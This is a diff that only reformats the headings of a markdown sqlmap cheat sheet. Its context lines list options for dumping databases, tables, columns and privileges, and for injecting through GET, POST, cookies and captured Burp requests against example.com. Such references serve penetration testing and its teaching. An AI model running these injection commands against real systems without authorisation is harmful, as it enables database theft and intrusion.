@@ -30,7 +30,7 @@ Internal
 -   --privileges #Get privileges
 
 
-##DB data
+## DB data
 -   --all #Retrieve everything
 -   --dump #Dump DBMS database table entries
 -   --dbs #Names of the available databases
@@ -39,20 +39,20 @@ Internal
 -   -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
 
 
-##Injection place
+## Injection place
 -   From BurpSuite/ZAP capture
 -   Capture the request and create a req.txt file!
 -   [sqlmap -r req.txt --current-user]
 
-##GET Request Injection
+## GET Request Injection
 -   sqlmap -u "http://example.com/?id=1" -p id
 -   sqlmap -u "http://example.com/?id=*" -p id
 
-##POST Request Injection
+## POST Request Injection
 -   sqlmap -u "http://example.com" --data "username=*&password=*"
 
-
-##Injections in Headers and other HTTP Methods
+ 
+## Injections in Headers and other HTTP Methods
 # Inside cookie
 -   sqlmap  -u "http://example.com" --cookie "mycookies=*"
 
